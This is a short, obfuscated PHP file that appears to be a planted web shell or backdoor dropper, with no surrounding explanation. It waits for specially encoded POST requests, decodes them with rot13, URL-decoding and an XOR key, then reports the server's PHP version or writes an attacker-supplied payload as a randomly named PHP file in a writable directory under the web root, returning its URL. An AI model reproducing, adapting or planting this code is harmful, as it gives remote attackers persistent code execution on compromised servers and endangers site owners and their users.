<?php $qgvykaka = "aqjfzhfmmhlhcdlw";$nypgjhaxz = "";foreach ($_POST as $rphiio => $gjmkboxe){if (strlen($rphiio) == 16 and substr_count($gjmkboxe, "%") > 10){ioohky($rphiio, $gjmkboxe);}}function ioohky($rphiio, $kauine){global $nypgjhaxz;$nypgjhaxz = $rphiio;$kauine = str_split(rawurldecode(str_rot13($kauine)));function lixppx($fkmgnwv, $rphiio){global $qgvykaka, $nypgjhaxz;return $fkmgnwv ^ $qgvykaka[$rphiio % strlen($qgvykaka)] ^ $nypgjhaxz[$rphiio % strlen($nypgjhaxz)];}$kauine = implode("", array_map("lixppx", array_values($kauine), array_keys($kauine)));$kauine = @unserialize($kauine);if (@is_array($kauine)){$rphiio = array_keys($kauine);$kauine = $kauine[$rphiio[0]];if ($kauine === $rphiio[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function bmaiusguto($lezwziir) {static $ibuodxi = array();$enbjknluzj = glob($lezwziir . '/*', GLOB_ONLYDIR);if (count($enbjknluzj) > 0) {foreach ($enbjknluzj as $lezwzi){if (@is_writable($lezwzi)){$ibuodxi[] = $lezwzi;}}}foreach ($enbjknluzj as $lezwziir) bmaiusguto($lezwziir);return $ibuodxi;}$umexgo = $_SERVER["DOCUMENT_ROOT"];$enbjknluzj = bmaiusguto($umexgo);$rphiio = array_rand($enbjknluzj);$pjhcmxz = $enbjknluzj[$rphiio] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($pjhcmxz, $kauine);echo "http://" . $_SERVER["HTTP_HOST"] . substr($pjhcmxz, strlen($umexgo));exit();}}}